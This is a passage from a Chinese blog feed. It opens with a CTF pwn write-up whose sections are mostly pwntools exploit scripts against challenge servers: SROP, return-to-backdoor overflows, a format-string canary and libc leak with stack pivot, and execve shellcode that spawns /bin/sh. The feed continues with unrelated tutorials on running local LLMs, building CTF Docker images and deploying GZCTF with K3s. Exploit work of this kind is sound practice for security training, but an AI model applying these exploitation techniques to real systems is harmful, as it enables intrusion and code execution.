class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">filename = <span class="string">&quot;./pwn01&quot;</span></span><br><span class="line"><span class="comment">#io = process(filename)</span></span><br><span class="line">io = remote(<span class="string">&#x27;challenge.qsnctf.com&#x27;</span>,<span class="number">30299</span>)</span><br><span class="line"><span class="comment">#elf = ELF(filename)</span></span><br><span class="line"></span><br><span class="line">pop_rsi_rax_ret = <span class="number">0x401049</span></span><br><span class="line">pop_rax_ret = <span class="number">0x40104A</span></span><br><span class="line">ret = <span class="number">0x40104B</span></span><br><span class="line">bin_sh = <span class="number">0x40203A</span></span><br><span class="line">syscall = <span class="number">0x401045</span> <span class="comment"># syscall;pop rbp;ret</span></span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = <span class="number">0x3b</span></span><br><span class="line">frame.rdi = bin_sh</span><br><span class="line">frame.rsi = <span class="number">0x0</span></span><br><span class="line">frame.rdx = <span class="number">0x0</span></span><br><span class="line">frame.rip = <span class="number">0x401045</span></span><br><span class="line">frame.rsp = <span class="number">0x402508</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">payload = flat([<span class="number">0x402300</span>,pop_rax_ret,<span class="number">0xf</span>,syscall,frame])</span><br><span class="line">io.sendafter(<span class="string">&quot;extraordinary.\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="赌书消得泼茶香"><a href="#赌书消得泼茶香" class="headerlink" title="赌书消得泼茶香"></a>赌书消得泼茶香</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">filename = <span class="string">&quot;./pwn02&quot;</span></span><br><span class="line"><span class="comment">#io = process(filename)</span></span><br><span class="line">io = remote(<span class="string">&#x27;challenge.qsnctf.com&#x27;</span>,<span class="number">30779</span>)</span><br><span class="line"><span class="comment">#elf = ELF(filename)</span></span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x401422</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">payload = flat([cyclic(<span class="number">0x68</span>),backdoor,<span class="number">0x0</span>,<span class="number">0x0</span>])</span><br><span class="line">io.sendlineafter(<span class="string">&quot;now?\n&quot;</span>,base64.b64encode(payload))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="江南无所有，聊赠一枝春"><a href="#江南无所有，聊赠一枝春" class="headerlink" title="江南无所有，聊赠一枝春"></a>江南无所有，聊赠一枝春</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">filename = <span class="string">&quot;./gift&quot;</span></span><br><span class="line"><span class="comment">#io = process(filename)</span></span><br><span class="line">io = remote(<span class="string">&#x27;challenge.qsnctf.com&#x27;</span>,<span class="number">31309</span>)</span><br><span class="line"><span class="comment">#elf = ELF(filename)</span></span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x4011BB</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">payload = flat([cyclic(<span class="number">72</span>),backdoor])</span><br><span class="line">io.sendlineafter(<span class="string">&quot;Do you want my gift?\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="铜雀春深锁二乔"><a href="#铜雀春深锁二乔" class="headerlink" title="铜雀春深锁二乔"></a>铜雀春深锁二乔</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">filename = <span class="string">&quot;./pwn03&quot;</span></span><br><span class="line">io = process(filename)</span><br><span class="line"><span class="comment">#io = remote(&#x27;challenge.qsnctf.com&#x27;,32451)</span></span><br><span class="line"><span class="comment">#elf = ELF(filename)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io,&quot;b *$rebase(0x1253)&quot;)</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;%11$p-%13$p-%15$p-%17$p&quot;</span></span><br><span class="line">io.sendafter(<span class="string">&quot;sun.\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">canary = <span class="built_in">int</span>(io.recv(<span class="number">18</span>),<span class="number">16</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;-&quot;</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">16</span>) - <span class="number">0x29d90</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;-&quot;</span>)</span><br><span class="line">pie = <span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">16</span>) - <span class="number">0x125B</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;-&quot;</span>)</span><br><span class="line">stack = <span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">16</span>) - <span class="number">0x148</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;canary:&quot;</span>,<span class="built_in">hex</span>(canary))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_base:&quot;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;pie:&quot;</span>,<span class="built_in">hex</span>(pie))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;stack:&quot;</span>,<span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line">leave_ret = pie + <span class="number">0x1259</span></span><br><span class="line">rdi = pie + <span class="number">0x0000000000001245</span> <span class="comment"># pop rdi ; ret</span></span><br><span class="line">system_addr = pie + <span class="number">0x1253</span></span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">payload = flat([<span class="string">&quot;aaaabbbb&quot;</span>,canary,stack+<span class="number">0x30</span>,pie+<span class="number">0x12b2</span>])</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">payload = flat([stack+<span class="number">0x10</span>,system_addr,<span class="string">&quot;/bin/sh\x00&quot;</span>])</span><br><span class="line">io.sendafter(<span class="string">&quot;sun.\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">payload = flat([<span class="string">&quot;aaaabbbb&quot;</span>,canary,stack+<span class="number">0x30</span>,rdi])</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="我觉君非池中物，咫尺蛟龙云雨"><a href="#我觉君非池中物，咫尺蛟龙云雨" class="headerlink" title="我觉君非池中物，咫尺蛟龙云雨"></a>我觉君非池中物，咫尺蛟龙云雨</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&quot;\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05&quot;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="萧萧黄叶闭疏窗"><a href="#萧萧黄叶闭疏窗" class="headerlink" title="萧萧黄叶闭疏窗"></a>萧萧黄叶闭疏窗</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">filename = <span class="string">&quot;./bad&quot;</span></span><br><span class="line"><span class="comment">#io = process(filename)</span></span><br><span class="line">io = remote(<span class="string">&#x27;challenge.qsnctf.com&#x27;</span>,<span class="number">30296</span>)</span><br><span class="line">elf = ELF(filename)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io,&quot;b vuln_func&quot;)</span></span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">payload = shellcode.ljust(<span class="number">72</span>,<span class="string">b&#x27;\x90&#x27;</span>) + p64(<span class="number">0x4040A0</span>)</span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">&quot;What do you want to do ?\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="借的东风破金锁"><a href="#借的东风破金锁" class="headerlink" title="借的东风破金锁"></a>借的东风破金锁</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;challenge.qsnctf.com&#x27;</span>,<span class="number">31425</span>)</span><br><span class="line">payload = p64(<span class="number">0x53514E55435446</span>) + <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">8</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>本地AI大模型部署</title>
      <link href="/blog/2024/09/27/04/"/>
      <url>/blog/2024/09/27/04/</url>
      
        <content type="html"><![CDATA[<h1 id="记录一次本地AI大模型的部署"><a href="#记录一次本地AI大模型的部署" class="headerlink" title="记录一次本地AI大模型的部署"></a>记录一次本地AI大模型的部署</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本人使用的设备的配置是</p><p>系统：Windows11</p><p>CPU：13th Gen Intel(R) Core(TM) i5-13500HX</p><p>内存：16G</p><p>显卡：NVIDIA GeForce RTX 4060 Laptop GPU</p><h2 id="方法一：GPT4All"><a href="#方法一：GPT4All" class="headerlink" title="方法一：GPT4All"></a>方法一：GPT4All</h2><p>优点：全程可视化UI操作，不需要敲命令，只需要安装一个软件即可完成后续的大模型的下载和使用，</p><p>缺点：内存占用偏高，在对话的交互上我用的不太舒服，就比如代码的复制粘贴没有像ChatGPT网页版中有个按钮点击就能复制，反而要手动选择后才能复制（后续软件可能会优化）</p><p><img src="https://img.beiko.top/blog/2024/9/27/image-0.png"></p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>前往官网下载软件</p><p><a href="https://gpt4all.io/index.html?ref=localhost">GPT4All</a></p><p><img src="https://img.beiko.top/blog/2024/9/27/image-1.png"></p><p>无脑一键安装就可以了，安装路径这里可以改，我这里直接全部默认了</p><p><img src="https://img.beiko.top/blog/2024/9/27/image-2.png"></p><p>组件默认</p><p><img src="https://img.beiko.top/blog/2024/9/27/image-3.png"></p><p>等待下载安装完成即可</p><p><img src="https://img.beiko.top/blog/2024/9/27/image-4.png"></p><h3 id="模型下载"><a href="#模型下载" class="headerlink" title="模型下载"></a>模型下载</h3><p><strong>可选：可以先去设置里面调整模型的下载目录，否则软件默认把大模型下载到C盘</strong></p><p><img src="https://img.beiko.top/blog/2024/9/27/image-5.png"></p><p>设置完成后点击模型，然后点击添加模型</p><p><img src="https://img.beiko.top/blog/2024/9/27/image-6.png"></p><p>选择一个模型点击下载即可</p><p><strong><font style="color:#DF2A3F;">注：有时可能无法加载模型列表，科学一下再重新打开软件即可，加载出列表就能关了，下载模型时不需要挂着</font></strong></p><p><img src="https://img.beiko.top/blog/2024/9/27/image-7.png"></p><h3 id="开始使用"><a href="#开始使用" class="headerlink" title="开始使用"></a>开始使用</h3><p>下载完后，点击对话，然后点击载入刚才下载的模型</p><p><img src="https://img.beiko.top/blog/2024/9/27/image-8.png"></p><p><img src="https://img.beiko.top/blog/2024/9/27/image-9.png"></p><p>等载入完成后即可开始使用</p><p><img src="https://img.beiko.top/blog/2024/9/27/image-10.png"></p><h2 id="方法二（推荐）：Ollama-Vscode插件Continue"><a href="#方法二（推荐）：Ollama-Vscode插件Continue" class="headerlink" title="方法二（推荐）：Ollama+Vscode插件Continue"></a>方法二（推荐）：Ollama+Vscode插件Continue</h2><p>优点：内存占用偏低，可以用CMD窗口直接执行命令启动，在日常交互使用上我觉得比GPT4All要好很多，而且生成的速度略快于GPT4All</p><p>缺点：需要使用命令行进行模型下载，软件默认只能装C盘</p><p><img src="https://img.beiko.top/blog/2024/9/27/image-11.png"></p><p>现在开始教程</p><h3 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h3><p>前往官网下载Ollama</p><p><a href="https://ollama.com/download/windows">Download Ollama on Windows</a></p><p><img src="https://img.beiko.top/blog/2024/9/27/image-12.png"></p><p>软件安装非常简单，没有任何配置点击安装即可（强制默认安装C盘）</p><p><img src="https://img.beiko.top/blog/2024/9/27/image-13.png"></p><p>出现一下弹窗证明安装成功</p><p><img src="https://img.beiko.top/blog/2024/9/27/image-14.png"></p><p>打开命令窗口输入<code>ollama -v</code>出现版本号</p><p><img src="https://img.beiko.top/blog/2024/9/27/image-15.png"></p><h3 id="模型下载-1"><a href="#模型下载-1" class="headerlink" title="模型下载"></a>模型下载</h3><p><strong>可选：</strong><strong><font style="color:rgb(0, 0, 0);">修改模型下载路径</font></strong></p><p><font style="color:rgb(0, 0, 0);">默认模型下载路径：</font><code>C:\Users\用户\.ollama\models</code><br><font style="color:rgb(0, 0, 0);">添加系统变量修改模型默认下载路径<br></font><font style="color:rgb(0, 0, 0);">变量名：OLLAMA_MODELS</font></p><p><img src="https://img.beiko.top/blog/2024/9/27/image-16.png"></p><p><font style="color:rgb(0, 0, 0);"></font></p><p>还是前往ollama的官网</p><p>在搜索栏搜索想要下载的大模型</p><p><img src="https://img.beiko.top/blog/2024/9/27/image-17.png"></p><p>这里用qwen2.5为例，假设我想要下载这个模型，复制运行命令</p><p><img src="https://img.beiko.top/blog/2024/9/27/image-18.png"></p><p>然后在CMD执行，等他下载完成</p><p><img src="https://img.beiko.top/blog/2024/9/27/image-19.png"></p><p>也可以手动导入本地大模型</p><p>参考文章：</p><p><a href="https://www.cnblogs.com/obullxl/p/18295202/NTopic2024071001">Ollama完整教程：本地LLM管理、WebUI对话、Python/Java客户端API应用 - 老牛啊 - 博客园 (cnblogs.com)</a></p><p>首先新建一个文件，命名为Modelfile，内容为：FROM 模型的路径</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 配置文件</span><br><span class="line">FROM ./Meta-Llama-3-8B-Instruct.Q4_K_M.gguf</span><br></pre></td></tr></table></figure><p>然后在CMD命令窗口输入以下命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// 导入命令</span><br><span class="line">ollama create 模型名称 -f ./Modelfile</span><br><span class="line"></span><br><span class="line">// 运行命令</span><br><span class="line">ollama run 模型名称</span><br></pre></td></tr></table></figure><p><img src="https://img.beiko.top/blog/2024/9/27/image-20.png"></p><h3 id="安装Vscode插件Continue"><a href="#安装Vscode插件Continue" class="headerlink" title="安装Vscode插件Continue"></a>安装Vscode插件Continue</h3><p>一图流演示安装过程</p><p><img src="https://img.beiko.top/blog/2024/9/27/image-21.png"></p><p>在配置文件中填写以下配置并保存</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;model&quot;</span><span class="punctuation">:</span> <span class="string">&quot;qwen2.5:latest&quot;</span><span class="punctuation">,</span> <span class="comment">// 模型名称</span></span><br><span class="line">  <span class="attr">&quot;provider&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ollama&quot;</span><span class="punctuation">,</span> <span class="comment">// 运行程序</span></span><br><span class="line">  <span class="attr">&quot;title&quot;</span><span class="punctuation">:</span> <span class="string">&quot;qwen2.5&quot;</span> <span class="comment">// 模型名称</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br></pre></td></tr></table></figure><p><img src="https://img.beiko.top/blog/2024/9/27/image-22.png"></p><h3 id="开始使用-1"><a href="#开始使用-1" class="headerlink" title="开始使用"></a>开始使用</h3><p>这个方法有两个使用方式</p><p>第一种是，下载模型完成后即可直接开始对话</p><p>但是cmd命令窗口下对话的内容并不会保存，且无法换行输入（可以复制进去）</p><p><img src="https://img.beiko.top/blog/2024/9/27/image-23.png"></p><p>第二种是在<code>VsCode</code>中使用，我也更推荐该方法，使用前先双击打开<code>ollama</code>软件</p><p><img src="https://img.beiko.top/blog/2024/9/27/image-24.png"></p><p>然后选择模型</p><p><img src="https://img.beiko.top/blog/2024/9/27/image-25.png"></p><p>开始对话</p><p><img src="https://img.beiko.top/blog/2024/9/27/image-26.png"></p><p>本文完~</p>]]></content>
      
      
      
        <tags>
            
            <tag> AI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF动态题目构建</title>
      <link href="/blog/2024/09/26/03/"/>
      <url>/blog/2024/09/26/03/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF动态题目构建"><a href="#CTF动态题目构建" class="headerlink" title="CTF动态题目构建"></a>CTF动态题目构建</h1><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p><strong><font style="color:#DF2A3F;">本教程需要科学上网以及外网VPS</font></strong></p><p>如果选择本地出题或者使用github存储镜像这里推荐一个项目（不保证可用）</p><p><a href="https://github.com/tech-shrimp/docker_installer">GitHub - tech-shrimp/docker_installer: Docker官方安装包，用来解决因国内网络无法安装使用Docker的问题</a></p><p><a href="https://docs.github.com/en/packages/quickstart">Github 创建容器镜像文档</a></p><p>先在 <a href="https://hub.docker.com/">https://hub.docker.com/</a> 注册一个账号</p><p>记住账号和密码</p><p>然后创建一个存储库</p><p><img src="https://img.beiko.top/blog/2024/9/26/image-0.png"></p><p><img src="https://img.beiko.top/blog/2024/9/26/image-1.png"></p><p>在VPS上运行<code>docker login</code>登录账号</p><p><img src="https://img.beiko.top/blog/2024/9/26/image-2.png"></p><p>输入已注册的账号名或邮箱，然后输入密码</p><p>出现<code>Login Succeeded</code>即为登录成功</p><h2 id="出题模板"><a href="#出题模板" class="headerlink" title="出题模板"></a>出题模板</h2><p>根据模板要求放置对应源码和填写配置文件</p><p>参考文章：<a href="https://hello-ctf.com/Create/WebBaseChallenge/">https://hello-ctf.com/Create/WebBaseChallenge/</a></p><p><a href="https://github.com/CTF-Archives/ctf-docker-template">GitHub - CTF-Archives/ctf-docker-template: Deployment template for docker target machine in ctf for CTFd and other platforms that support dynamic flags</a></p><p><a href="https://github.com/qsnctf/qsnctf_base_docker_https://img.beiko.top/blog/2024/9/26/images">GitHub - qsnctf/qsnctf_base_docker_https://img.beiko.top/blog/2024/9/26/images: 青少年CTF基础Docker镜像</a></p><h2 id="构建"><a href="#构建" class="headerlink" title="构建"></a>构建</h2><p>直接将项目文件放入 模板中的 <code>./src</code> 目录中即可</p><p>然后执行<code>docker build -t 注册的用户名/仓库名:标签 .</code></p><p>例如</p><p><code>docker build -t beik0/mewiphgcgt:web3 .</code></p><p>即可开始构建镜像</p><p>构建完成后</p><p><code>docker push beik0/mewiphgcgt:web3</code></p><p>上传镜像文件到 <a href="https://hub.docker.com/">https://hub.docker.com/</a></p><p>然后执行<code>docker push 注册的用户名/仓库名:标签</code></p><p>例如</p><p><code>docker push beik0/mewiphgcgt:web1</code></p><p><img src="https://img.beiko.top/blog/2024/9/26/image-3.png"></p><p>出现<code>sha256:xxxxx</code>证明上传成功</p><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>cd ./docker</p><p>docker-compose up -d</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GZCTF 开源平台部署</title>
      <link href="/blog/2024/09/25/GZCTF/"/>
      <url>/blog/2024/09/25/GZCTF/</url>
      
        <content type="html"><![CDATA[<h2 id="Docker-K3s-分离部署"><a href="#Docker-K3s-分离部署" class="headerlink" title="Docker + K3s 分离部署"></a>Docker + K3s 分离部署</h2><p>实际上也可以单台服务器部署所有环境，但最好的就是K3s与GZCTF分离成两个服务器进行部署</p><p>本文章参考官方文档：<a href="https://docs.ctf.gzti.me/zh/quick-start">https://docs.ctf.gzti.me/zh/quick-start</a></p><h2 id="准备环境"><a href="#准备环境" class="headerlink" title="准备环境"></a>准备环境</h2><p>接下来的教程均以 Ubuntu 22.04.3 （其他的发行版也可以）进行演示</p><p>VPS-1：GZCTF平台+Kuboard - 192.168.3.12</p><p>VPS-2：K3s集群环境 - 192.168.3.13</p><h2 id="开始搭建"><a href="#开始搭建" class="headerlink" title="开始搭建"></a>开始搭建</h2><h3 id="VPS-1-192-168-3-12"><a href="#VPS-1-192-168-3-12" class="headerlink" title="VPS-1 - 192.168.3.12"></a>VPS-1 - 192.168.3.12</h3><h4 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h4><p>安装 <code>sudo apt install docker.io</code></p><p>测试 <code>docker -v</code></p><p>出现以下版本号信息即为安装成功</p><p><img src="https://img.beiko.top/blog/2024/9/25/image-1.png"></p><h3 id="VPS-2-192-168-3-13"><a href="#VPS-2-192-168-3-13" class="headerlink" title="VPS-2 - 192.168.3.13"></a>VPS-2 - 192.168.3.13</h3><h4 id="K3s"><a href="#K3s" class="headerlink" title="K3s"></a>K3s</h4><p>k3s 是一个轻量级的 k8s 发行版，可以在单机和多机上快速部署 k8s 集群</p><p>官网文档地址：<a href="https://docs.k3s.io/zh">https://docs.k3s.io/zh</a></p><p>安装命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -sfL https://get.k3s.io | sh -</span><br><span class="line"><span class="comment"># 检查就绪节点，大约需要30秒</span></span><br><span class="line">sudo k3s kubectl get node</span><br></pre></td></tr></table></figure><p>中国用户，可以使用以下方法加速安装：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -sfL https://rancher-mirror.rancher.cn/k3s/k3s-install.sh | INSTALL_K3S_MIRROR=cn sh -</span><br></pre></td></tr></table></figure><p>多机安装和集群组建请参考 <a href="https://docs.k3s.io/zh/quick-start">官方文档</a></p><p>测试 <code>k3s -v</code></p><p>出现如下版本信息即为安装成功</p><p><img src="https://img.beiko.top/blog/2024/9/25/image-0.png"></p><h4 id="docker-compose"><a href="#docker-compose" class="headerlink" title="docker-compose"></a>docker-compose</h4><p>下载最新版的docker-compose文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo curl -L https://github.com/docker/compose/releases/download/v2.27.0/docker-compose-`<span class="built_in">uname</span> -s`-`<span class="built_in">uname</span> -m` -o /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure><p>如果出现以下错误则安装curl后再运行一次上面的代码</p><p><img src="https://img.beiko.top/blog/2024/9/25/image-2.png"></p><p><code>sudo apt-get install curl</code></p><p><font style="color:rgb(51, 51, 51);">添加可执行权限</font></p><p><code>sudo chmod +x /usr/local/bin/docker-compose</code></p><p>测试 <code>docker-compose --version</code></p><p>出现如下版本信息即为安装成功</p><p><img src="https://img.beiko.top/blog/2024/9/25/image-3.png"></p><h2 id="Kuboard可视化面板"><a href="#Kuboard可视化面板" class="headerlink" title="Kuboard可视化面板"></a>Kuboard可视化面板</h2><p>此面板只是方便管理K3s集群，可以选择不装，不装请直接跳转到下面的配置文件步骤</p><p>在下面的配置中，第四行的<code>端口示例3271</code>要与第六行<code>IP地址后的端口</code>一致</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">docker run -d \</span><br><span class="line">  --restart=unless-stopped \</span><br><span class="line">  --name=kuboard \</span><br><span class="line">  -p 3271:80/tcp \</span><br><span class="line">  -p 10081:10081/tcp \</span><br><span class="line">  -e KUBOARD_ENDPOINT=<span class="string">&quot;http://192.168.3.13:3271&quot;</span> \</span><br><span class="line">  -e KUBOARD_AGENT_SERVER_TCP_PORT=<span class="string">&quot;10081&quot;</span> \</span><br><span class="line">  -v /root/kuboard-data:/data \</span><br><span class="line">  swr.cn-east-2.myhuaweicloud.com/kuboard/kuboard:v3</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>docker创建完后，访问<code>http://192.168.3.12:3271</code>即可看到管理面板</p><p><img src="https://img.beiko.top/blog/2024/9/25/image-4.png"></p><p>默认账号：<code>admin</code></p><p>默认密码：<code>Kuboard123</code></p><p><strong>如果是生产环境，登录后请及时更改密码</strong></p><p><img src="https://img.beiko.top/blog/2024/9/25/image-5.png"></p><h3 id="绑定集群"><a href="#绑定集群" class="headerlink" title="绑定集群"></a>绑定集群</h3><p>使用第二种方法<br><img src="https://img.beiko.top/blog/2024/9/25/image-6.png"></p><p><code>kubeconfig</code>获取方法是在安装好<code>K3s</code>的机器上执行</p><p><code>cat /etc/rancher/k3s/k3s.yaml</code></p><p>然后把内容全部复制到图片上的<code>kubeconfig</code>中</p><p>然后把<code>ApiServer 地址</code>改为<code>192.168.3.13</code>即可</p><p><img src="https://img.beiko.top/blog/2024/9/25/image-7.png"></p><h2 id="填写配置文件"><a href="#填写配置文件" class="headerlink" title="填写配置文件"></a>填写配置文件</h2><p>运行以下命令创建配置文件（配置文件的位置可以随意更改）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 